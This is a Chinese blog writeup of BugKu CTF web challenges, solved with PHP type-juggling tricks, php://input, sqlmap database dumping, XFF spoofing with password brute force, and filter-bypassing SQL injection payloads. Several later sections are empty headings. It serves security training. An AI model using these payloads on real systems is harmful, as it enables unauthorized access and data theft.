---
layout:     post
title:      新BugKu平台web题writeup
subtitle:   新Bugku平台，又名newbugku，打靶CTF，CTF_论剑场。包含题目web26、web1、web9、流量分析、web2、web5、web6、web11、web13、日志审计、web18、web20、web3、web4、web15、web14、web21、web23、web7。
date:       2020-06-18
author:     HouKC
header-img: img/post-bg-coffee.jpeg
catalog:    true
tags:
    - CTF
    - web
    - writeup
    - 网络安全
---

## web26
```php
<?php
$num=$_GET['num'];
$str=$_GET['str'];
show_source(__FILE__);
if (isset($num)&&isset($str)) {
    if (preg_match('/\d+/sD',$str)) {
        echo "vagetable hhhh";
        exit();
    }
    $result=is_numeric($num) and is_numeric($str);
    if ($result) {
        include "flag.php";
        echo "$flag";
    }
    else{
        echo "vagetablessssss";
    }
} 
```
可以看出需要get请求带两个参数num和str，根据preg_match('/\d+/sD‘,$str)可知是匹配，当str为数值(\d+)时就会匹配到。

s是.匹配符可以匹配换行，以及D是如果有$结尾，则不允许结尾换行。这两个与本题没什么关系，反正就是匹配数值，str不是数值就行。

然后我们又在这行$result=is_numeric($num) and is_numeric($str);发现了php逻辑运算符and，由于php中**and**的优先级比 **=** 低，所以会先将is_numeric($num) 的值赋值给result，这里只要保证num是数值，那么不管str是不是数值，也就是不管is_numeric($str)是真还是假，result都是真。

因此构造url为：
```
http://123.206.31.85:10026/?num=123&str=abc
```
即可返回flag
```
?> No No No Don't want to go back the door!!!flag{f0058a1d652f13d6}
```


## web1
审计图片里的代码，可以分析到需要get请求带两个参数，一个是a，一个是b，b要传一个文件，但这里我们利用php://input可以从http请求中读取。

我们随便给a一个值，比如1，然后给b的值是php://input，接着我们用burpsuite抓包，补充上准备给php://input读取的值，写在http请求中。

get请求链接如下：
```
http://123.206.31.85:10001/?a=1&b=php://input
```
bp抓包后修改如下，在请求头后面加上a的值：
![web1-bp抓包](https://raw.githubusercontent.com/HouKC/houkc.github.io/master/img/web1-bp.png)
即可收到返回的flag

```
flag{c3fd1661da5efb989c72b91f3c378759}
```

## web9
根据提示put me a message bugku then you can get the flag 可以知道要用PUT请求，并且带上数据bugku。

- 方法一：打开postman软件，选择PUT请求，填入链接，然后选择下方body按钮，选择raw格式，在下面的输入框中输入bugku，然后发送即可。
- 方法二：用burpsuite拦截，抓包后发送到repeater修改，把GET改成PUT，并在http头中间加入两行
  - Referer: http://123.206.31.85:303/
  - Content-Type:application/x-www-form-urlencoded
然后再在下面加上内容bugku即可。

接着会收到一串字符串ZmxhZ3tUN2w4eHM5ZmMxbmN0OE52aVBUYm4zZkcwZHpYOVZ9
base64解密即可得到
```
flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}
```

## 流量分析
下载附件，.pcapng文件用wireshark打开，大概扫了一下，在下半部分有很多telnet数据包，可能是进行telnet连接。

在Filter中输入telnet进行筛选，并且打开telnet第一个包点击wireshark界面下方显示telnet协议内容，然后依次打开telnet包一直往下看每个包的数据。

可以发现从第11个telnet包开始，先是login输入了账号，看着是发一个字节的包，对方就回一个一样的包，所以只看192.168.31.7发送的就好，账号连起来是bugku，然后password连起来是flag{bugku123456}
所以flag为：
```
flag{bugku123456}
```

## web2
返回页面包含一串数学公式计算，而且要求三秒内实现，上脚本
```python
import requests
import re
s = requests.Session()
response = s.get('http://123.206.31.85:10002/')

raw_data = re.findall("<br/>\n(.*?)</p>", response.text, re.S)[0]

data = eval(raw_data)

response = s.post("http://123.206.31.85:10002/", data={"result": str(data)})
print(response.text)
```
注意用session保存会话连接状态，先get请求一下得到公式，用正则匹配出公式部分，然后eval执行，得到结果通过post请求返回，“result”这个关键词通过burpsuite抓包或者查看源码都可以找到。接着输出post请求的响应包即可得到flag
```
flag{b37d6bdd7bb132c7c7f6072cd318697c}
```

## web5
点一下各个页面，发现点击flag的链接是http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1
于是尝试对该链接进行sqlmap自动注入，注入命令如下：
```shell
# 查询数据库
sqlmap -u "http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1" --batch -p "id" --dbs
# 返回结果
#available databases [3]:
#[*] information_schema
#[*] test
#[*] web5

# 查询web5数据库的表名
sqlmap -u "http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1" --batch -p "id" -D web5 --table
# 返回结果
#Database: web5
#[3 tables]
#+-------+
#| flag  |
#| posts |
#| users |
#+-------+

# 查询flag表的列名
sqlmap -u "http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1" --batch -p "id" -D web5 -T flag --column
# 返回结果
#Database: web5
#Table: flag
#[1 column]
#+--------+--------------+
#| Column | Type         |
#+--------+--------------+
#| flag   | varchar(255) |
#+--------+--------------+

# 爆数据
sqlmap -u "http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1" --batch -p "id" -D web5 -T flag -C flag --dump
# 返回结果
#Database: web5
#Table: flag
#[1 entry]
#+----------------------------------------+
#| flag                                   |
#+----------------------------------------+
#| flag{320dbb1c03cdaaf29d16f9d653c88bcb} |
#+----------------------------------------+
```
所以flag为
```
flag{320dbb1c03cdaaf29d16f9d653c88bcb}
```

## web6
随便输入用户名admin和密码123456，然后提交，发现返回”IP禁止访问，请联系本地管理员登陆，IP已被记录“。想到要用X-Forwarded-For:127.0.0.1。

burpsuite抓包，加上X-Forwarded-For:127.0.0.1，再随便提交就没有报IP禁止了。

然后将这个加了XFF的包发送到Intruder进行弱密爆破，可以得到密码为test123。

可以在返回包中看到The flag is: 85ff2ee4171396724bae20c0bd851f6b
所以flag为
```
flag{85ff2ee4171396724bae20c0bd851f6b}
```

## web11
根据提示打开链接http://123.206.31.85:3030/robots.txt 查询robots.txt文件，得知还有shell.php文件，访问http://123.206.31.85:3030/shell.php 得到网页内容。

需要在短时间内找出一个字符串，使md5值前6位与网页中给出的一致，查看源码得知是要get请求提交参数password。编写脚本如下：
```python
import hashlib
import requests
import re

s = requests.session()
response = s.get("http://123.206.31.85:3030/shell.php")

data = re.findall("\), 0, 6\) = (.*?)<", response.text, re.S)[0]
print(data)
for i in range(1000000):
    m = hashlib.md5()
    m.update(str(i).encode('utf-8'))
    if m.hexdigest().startswith(data):
        print(str(i))
        print(m.hexdigest())
        break

response = s.get("http://123.206.31.85:3030/shell.php?password={}".format(str(i)))
print(response.text)
```
得到flag为
```
flag{e2f86fb5f75da4999e6f4957d89aaca0}
```

## web13
随便填写，然后burpsuite抓包，发现返回包头中有一个password字段，看起来是base64，进行解码得到flag，但提交失败，应该是假的flag。

而且burpsuite重复发送几次发现password返回结果都不一样，所以一定不是这个flag，可能需要把这个假的flag中的花括号里面内容post提交，编写脚本（因为动态flag通常有时效，还是用脚本速战速决）后返回得到flag，这个才是真正的flag。
脚本如下：
```python
import requests
import base64

s = requests.session()
response = s.get("http://123.206.31.85:10013/index.php")
raw_password = response.headers['Password']
password = base64.b64decode(raw_password.encode('utf-8')).decode('utf-8')
print(password)

response = s.post("http://123.206.31.85:10013/index.php", data={"password": password[5:-1]})
print(response.text)
```
得到flag为
```
flag{FjXAkdGnOBoIUZaFzHqjInY2VndLSg}
```

## 日志审计
下载日志文件，在notepad++中打开后，搜索flag（后来发现应该搜索sqlmap的。。），找到有一块日志一连串地请求同一个链接，而且请求中带有sqlmap，应该是在用sqlmap进行SQL注入。
```
/flag.php?user=hence...
/flag.php?user=hence...
...
```
编写脚本进行url解码，然后发现解码后的链接中有一些数字，如102，108，97，103，这就是"flag"的ascii码，所以连着后面几个链接中的数字进行转换，得到flag为
```
flag{mayiyahei1965ae7569}
```
脚本如下：
```python
import urllib.parse
import re

with open('./日志审计.log', 'r') as f:
    lines = f.readlines()

lines = [re.findall('\)\)=(.*?)--', urllib.parse.unquote(line).strip())[0] for line in lines if '/flag.php?' in line]
for line in lines:
    print(line)

print(''.join([chr(int(line)) for line in lines]))
```

## web18
点一下能点的按钮，发现List按钮链接中有id，可能存在注入点，修改id值
```
# 测试注入点
?id=1			# 结果正常
?id=1'			# 结果为空，说明闭合了前面的'号
?id=1' --+ 		# 结果正常，说明注释后面成功了，那么接下来就在中间添加注入语句

# 测试是否存在过滤
?id=1' or 1=1 --+		# 结果为空，可能过滤了or
?id=1' oorr 1=1 --+		# 双写绕过，结果正常了，确实是过滤了or，推测可能也过了了select、union、and等
?id=1'^(length('select')!=0) --+	# 异或注入看看是不是真过滤了，返回结果正常，表示确实过滤了，同理可以测试union也被过滤了

# 测试字段数和输出位置
?id=-1' uniounionn selecselectt 1,2,3 --+		# 结果正常，表示字段数为3个，并且从输出看的话，会输出第2、3个字段，因为第1个会被what do you do?这个字符串占用。

# 开始爆库、爆表、爆字段、爆数据
?id=

```
## web20
## web3
## web4
## web15
## web14
## web21
## web23
## web7